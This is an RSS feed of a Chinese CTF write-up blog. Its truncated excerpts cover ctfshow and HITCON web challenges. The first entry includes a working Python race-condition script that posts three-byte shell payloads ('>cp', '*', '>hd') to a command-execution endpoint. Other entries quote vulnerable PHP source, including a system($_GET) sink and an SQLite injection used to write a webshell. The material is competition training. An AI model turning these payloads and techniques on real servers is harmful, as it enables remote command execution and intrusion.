<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>baozongwi's blog</title><link>https://baozongwi.xyz/tags/racecondition/</link><description>baozongwi's blog</description><lastBuildDate>Mon, 16 Feb 2026 16:56:06 +0800</lastBuildDate><atom:link href="https://baozongwi.xyz/tags/racecondition/" rel="self" type="application/rss+xml"/><item><title>Ctfshow极限大挑战之三字节读取文件</title><link>https://baozongwi.xyz/p/ctfshow-extreme-challenge-3-byte-file-read/</link><guid>https://baozongwi.xyz/p/ctfshow-extreme-challenge-3-byte-file-read/</guid><pubDate>Tue, 26 Aug 2025 18:08:15 +0800</pubDate><description>极限命令执行6 1 2 3 4 5 6 7 8 9 10 11 12 &amp;amp;lt;?php error_reporting(0); if (isset($_POST[&amp;amp;#39;ctf_show&amp;amp;#39;])) { $ctfshow = $_POST[&amp;amp;#39;ctf_show&amp;amp;#39;]; if (is_string($ctfshow) &amp;amp;amp;&amp;amp;amp; strlen($ctfshow) &amp;amp;lt;= 3) { sleep(1); system($ctfshow); } }else{ highlight_file(__FILE__); } ?&amp;amp;gt; 没有限制，就是三个字节就能任意执行，第一想法还是HITCON类似的依靠文件名来进行RCE，ls发现在当前目录有flag，我们可以知道*类似于.，如果只有这个命令的话可以默认执行当前目录第一个文件
现在我们的目的就是覆盖index.php，由于首字母要小于f大于i，所以查了一下只有hd，hd解析的是hexdump就能读取index.php
1 2 3 4 &amp;amp;gt;cp * &amp;amp;gt;hd *d* 但是我们是利用index.php来RCE的，所以需要Race Condition
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 from concurrent.futures import ThreadPoolExecutor import time import requests url = &amp;amp;#34;http://c29db3cd-5f18-40f9-b134-ad172979409a.challenge.ctf.show/&amp;amp;#34; check = {&amp;amp;#39;ctf_show&amp;amp;#39;: &amp;amp;#39;ls&amp;amp;#39;} payload0 = {&amp;amp;#39;ctf_show&amp;amp;#39;: &amp;amp;#39;&amp;amp;gt;cp&amp;amp;#39;} payload1 = {&amp;amp;#39;ctf_show&amp;amp;#39;: &amp;amp;#39;*&amp;amp;#39;} payload2 = {&amp;amp;#39;ctf_show&amp;amp;#39;: &amp;amp;#39;&amp;amp;gt;hd&amp;amp;#39;} payload3 = {&amp;amp;#39;ctf_show&amp;amp;#39;: &amp;amp;#39;*d*&amp;amp;#39;} def send(data): r = requests.post(url, data=data) print(r.text) if __name__ == &amp;amp;#34;__main__&amp;amp;#34;: send(payload0) send(check) time.sleep(1) executor = ThreadPoolExecutor(max_workers=50) args_list = [payload1, payload2, payload3] for args in args_list: time.sleep(0.1) executor.submit(send, args) 极限命令执行7 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 &amp;amp;lt;?php error_reporting(0); #go back home , your flag is not here! if (isset($_POST[&amp;amp;#39;ctf_show&amp;amp;#39;])) { $ctfshow = $_POST[&amp;amp;#39;ctf_show&amp;amp;#39;]; if (is_string($ctfshow) &amp;amp;amp;&amp;amp;amp; strlen($ctfshow) &amp;amp;lt;= 3) { system($ctfshow); } }else{ highlight_file(__FILE__); } ?&amp;amp;gt; 提示了flag在home目录下，然后其他的就没区别了，由于不在当前目录，所以上一题的思路已经用不了了，既然这样，我们就要想办法把文件从/home带到当前目录，最好的办法就是压缩文件了</description><content:encoded>极限命令执行6 1 2 3 4 5 6 7 8 9 10 11 12 &amp;amp;amp;lt;?php error_reporting(0); if (isset($_POST[&amp;amp;amp;#39;ctf_show&amp;amp;amp;#39;])) { $ctfshow = $_POST[&amp;amp;amp;#39;ctf_show&amp;amp;amp;#39;]; if …</content:encoded></item><item><title>HITCON2025</title><link>https://baozongwi.xyz/p/hitcon2025/</link><guid>https://baozongwi.xyz/p/hitcon2025/</guid><pubDate>Mon, 25 Aug 2025 14:38:50 +0800</pubDate><description>Pholyglot!（31solves） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 &amp;amp;lt;?php $sandbox = &amp;amp;#39;/www/sandbox/&amp;amp;#39; . md5(&amp;amp;#34;orange&amp;amp;#34; . $_SERVER[&amp;amp;#39;REMOTE_ADDR&amp;amp;#39;]); @mkdir($sandbox); @chdir($sandbox) or die(&amp;amp;#34;err?&amp;amp;#34;); $msg = @$_GET[&amp;amp;#39;msg&amp;amp;#39;]; if (isset($msg) &amp;amp;amp;&amp;amp;amp; strlen($msg) &amp;amp;lt;= 30) { usleep(random_int(133, 3337)); $db = new SQLite3(&amp;amp;#34;.db&amp;amp;#34;); $db-&amp;amp;gt;exec(sprintf(&amp;amp;#34; CREATE TABLE msg (content TEXT); INSERT INTO msg VALUES(&amp;amp;#39;%s&amp;amp;#39;); &amp;amp;#34;, $msg)); $db-&amp;amp;gt;close(); unlink(&amp;amp;#34;.db&amp;amp;#34;); } else if (isset($_GET[&amp;amp;#39;reset&amp;amp;#39;])) { @exec(&amp;amp;#39;/bin/rm -rf &amp;amp;#39; . $sandbox); } else { highlight_file(__FILE__); } 目录是根据远程IP来生成的，同时限制30个字符写入，很明显的sql注入，可以插入表创建内容，现在就是写入webshell即可。写入的手法，我在前面做CTFSHOW常用姿势时有所了解，可以利用拼接sh参数写入，利用在当前目录创建的文件名拼接成一条完整的命令。 https://baozongwi.xyz/p/ctfshow-common-techniques/#web821</description><content:encoded>Pholyglot!（31solves） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 &amp;amp;amp;lt;?php $sandbox = &amp;amp;amp;#39;/www/sandbox/&amp;amp;amp;#39; . md5(&amp;amp;amp;#34;orange&amp;amp;amp;#34; . …</content:encoded></item><item><title>hxp38C3CTF</title><link>https://baozongwi.xyz/p/hxp38c3ctf/</link><guid>https://baozongwi.xyz/p/hxp38c3ctf/</guid><pubDate>Thu, 27 Mar 2025 20:14:55 +0000</pubDate><description>牛</description><content:encoded>起环境的时候发现了这样的报错
1 2 3 [+] Running 1/0 ✘ Network haschbargeld_default Error 0.0s failed to create network haschbargeld_default: Error response from …</content:encoded></item><item><title>ctfshow元旦水友赛</title><link>https://baozongwi.xyz/p/ctfshow-new-year-water-friends-match/</link><guid>https://baozongwi.xyz/p/ctfshow-new-year-water-friends-match/</guid><pubDate>Mon, 20 Jan 2025 18:53:17 +0000</pubDate><description>有意思的</description><content:encoded>easy_include 1 2 3 4 5 6 7 8 9 10 &amp;amp;amp;lt;?php function waf($path){ $path = str_replace(&amp;amp;amp;#34;.&amp;amp;amp;#34;,&amp;amp;amp;#34;&amp;amp;amp;#34;,$path); return …</content:encoded></item><item><title>SrdnlenCTF2025</title><link>https://baozongwi.xyz/p/srdnlenctf2025/</link><guid>https://baozongwi.xyz/p/srdnlenctf2025/</guid><pubDate>Sun, 19 Jan 2025 19:42:32 +0000</pubDate><description>shit</description><content:encoded>Ben 10 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 …</content:encoded></item><item><title>ctfshow原谅杯</title><link>https://baozongwi.xyz/p/ctfshow-forgiveness-cup/</link><guid>https://baozongwi.xyz/p/ctfshow-forgiveness-cup/</guid><pubDate>Thu, 16 Jan 2025 19:39:50 +0000</pubDate><description>刷</description><content:encoded>原谅4 1 &amp;amp;amp;lt;?php isset($_GET[&amp;amp;amp;#39;xbx&amp;amp;amp;#39;])?system($_GET[&amp;amp;amp;#39;xbx&amp;amp;amp;#39;]):highlight_file(__FILE__); 一个压缩包里面没有源码就一个瓜而已，好吧，那就是ls去找看看有没有命令可以用了，我们知道/bin下面有命 …</content:encoded></item><item><title>ctfshow36D练手赛</title><link>https://baozongwi.xyz/p/ctfshow-36d-practice-match/</link><guid>https://baozongwi.xyz/p/ctfshow-36d-practice-match/</guid><pubDate>Wed, 11 Dec 2024 19:51:33 +0000</pubDate><description>刷</description><content:encoded>之前做了一个第二个做不出来，现在看了一下很简单的一个题目嘛
不知所措.jpg 进来发现这个东西怎么都会进行拼接，是GET参数
1 …</content:encoded></item><item><title>session文件包含</title><link>https://baozongwi.xyz/p/session-file-inclusion/</link><guid>https://baozongwi.xyz/p/session-file-inclusion/</guid><pubDate>Fri, 27 Sep 2024 13:39:03 +0000</pubDate><description>经典</description><content:encoded>0x01 前言 之前觉得很难的姿势，现在学习了一下，感觉还行啊，果然多多尝试才有结果
0x02 question 这个的大部分基础知识都在session反序列化提到了，所以这里就将session文件包含所需要的，当涉及session的时候，我们可以利用ID来保留属于自己的信息
那么我们如果上传文件进 …</content:encoded></item></channel></rss>